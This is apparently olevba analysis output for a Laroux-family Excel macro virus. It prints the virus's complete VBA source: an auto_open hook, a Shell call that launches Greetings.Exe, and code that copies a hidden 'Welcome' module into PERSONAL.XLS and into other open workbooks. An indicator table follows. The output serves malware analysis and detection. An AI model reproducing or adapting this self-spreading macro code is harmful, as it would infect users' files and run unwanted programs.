olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-1f39077b82aa22cae407c55a008d6f5847df0382
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Welcome.bas 
in file: Virus.MSExcel.Laroux-based-1f39077b82aa22cae407c55a008d6f5847df0382 - OLE stream: '_VBA_PROJECT_CUR/VBA/Welcome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
On Error Resume Next
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "PERSONAL.XLS")
    If m$ = "PERSONAL.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    Select Case whichfile
        Case 10
            Call Shell(c$ & "\Greetings.Exe", vbNormalFocus)
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            Sheets("Welcome").Select True
            Sheets("Welcome").Copy
            newname$ = ActiveWorkbook.Name
            c4$ = CurDir()
            ChDir Application.StartupPath
            ActiveWindow.Visible = False
            Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "PERSONAL.XLS", FileFormat:=xlNormal _
                , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
                False, CreateBackup:=False
            ChDir c4$
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "personal.xls!check_files"
        Case 1
            Call Shell(c$ & "\Greetings.Exe", vbNormalFocus)
            Application.ScreenUpdating = False
            n4$ = ActiveWorkbook.Name
            p4$ = ActiveWorkbook.Path
            s$ = Workbooks(p4$ & "\" & n4$).Sheets(1).Name
            If s$ <> "Welcome" Then
                Workbooks("PERSONAL.XLS").Sheets("Welcome").Copy before:=Workbooks(n4$).Sheets(1)
                Workbooks(n4$).Sheets("Welcome").Visible = False
            End If
            Application.OnSheetActivate = ""
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "personal.xls!check_files"
    End Select
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Welcom
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|IOC       |Greetings.Exe       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

